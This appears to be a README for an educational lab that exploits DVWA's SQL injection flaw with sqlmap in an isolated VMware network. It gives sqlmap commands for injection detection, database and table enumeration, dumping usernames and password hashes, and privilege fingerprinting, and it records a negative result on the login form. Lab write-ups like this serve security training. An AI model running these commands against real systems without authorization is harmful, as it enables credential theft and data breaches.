# SQL Injection Exploitation Lab — DVWA & sqlmap

## 🎯 Objective
Demonstrate automated detection and exploitation of a SQL Injection vulnerability using **sqlmap** against **DVWA (Damn Vulnerable Web Application)**, including full database enumeration and data extraction.

> ⚠️ This project was conducted entirely in an **isolated local lab environment** (VMware, host-only network) using intentionally vulnerable applications. No real-world or production systems were targeted.

## 🧪 Lab Environment
| Component | Role | Details |
|---|---|---|
| Kali Linux | Attacker machine | sqlmap, Burp Suite, Firefox |
| Metasploitable2 | Target machine | Hosts DVWA (Damn Vulnerable Web App) |
| Network | VMware Host-only / NAT | Isolated from production network |

## 🛠️ Tools Used
- `sqlmap` — automated SQL injection detection & exploitation
- DVWA (Security level: Low)
- Firefox Developer Tools — session cookie extraction
- `curl` — manual cookie/session testing

## 📋 Methodology

### 1. Environment Setup
- Identified target IP (`$TARGET`) via `netdiscover`
- Verified DVWA access and set security level to **Low**

### 2. Session Authentication
- Retrieved valid `PHPSESSID` and `security` cookies from an authenticated browser session
- Passed cookies to sqlmap via `--cookie` to maintain authentication during scans

### 3. Injection Detection
```bash
sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="$COOKIE" --batch
```
sqlmap automatically tested multiple injection techniques: boolean-based, error-based, UNION-based, time-based, and stacked queries.

### 4. Database Enumeration
```bash
sqlmap -u "..." --cookie="$COOKIE" --batch --dbs                      # list databases
sqlmap -u "..." --cookie="$COOKIE" --batch -D dvwa --tables           # list tables
sqlmap -u "..." --cookie="$COOKIE" --batch -D dvwa -T users --columns # list columns
```

### 5. Data Extraction
```bash
sqlmap -u "..." --cookie="$COOKIE" --batch -D dvwa -T users -C user,password --dump
```
Extracted usernames and password hashes from the `users` table.

### 6. Server & Privilege Fingerprinting
```bash
sqlmap -u "..." --cookie="$COOKIE" --batch --banner --current-user --current-db --is-dba
```

### 7. POST-Based Injection (Login Form)
Tested the DVWA login form (`username` / `password` fields) for injectability:
```bash
sqlmap -u "http://$TARGET/dvwa/login.php" \
  --data="username=admin&password=admin&Login=Login" \
  --cookie="$COOKIE" --batch
```
Also tested each parameter individually using `-p username` / `-p password` to isolate and document which field was vulnerable.

Result: sqlmap ran a full suite of detection techniques (boolean-based, error-based, UNION-based, time-based, stacked queries) with no success — the login POST parameter was confirmed not injectable:

[CRITICAL] all tested parameters do not appear to be injectable.

This negative result is expected and was documented as part of the assessment: unlike the sqli/ endpoint, DVWA's login mechanism is not designed to be vulnerable. Testing and recording a non-vulnerable endpoint is as much a part of a thorough assessment as confirming an exploitable one.

## 🔑 Key sqlmap Options Used
| Option | Purpose |
|---|---|
| `-u` | Target URL |
| `--cookie` | Authenticated session |
| `--data` | POST parameters |
| `--batch` | Non-interactive mode |
| `--dbs` / `-D` / `-T` / `--columns` / `--dump` | Database enumeration & extraction |
| `-p` | Target a specific parameter |
| `--banner --current-user --current-db --is-dba` | Server & privilege fingerprinting |

## 🧠 Key Takeaways
- Practical understanding of the full SQL injection kill chain: detection → enumeration → extraction
- Hands-on experience maintaining authenticated sessions with sqlmap via cookies
- Learned to isolate and test individual POST parameters for targeted vulnerability assessment

## ⚖️ Disclaimer
This project is for educational purposes only, performed in a personal, isolated lab environment on applications designed to be vulnerable (DVWA). Do not run these techniques against systems you do not own or have explicit authorization to test.
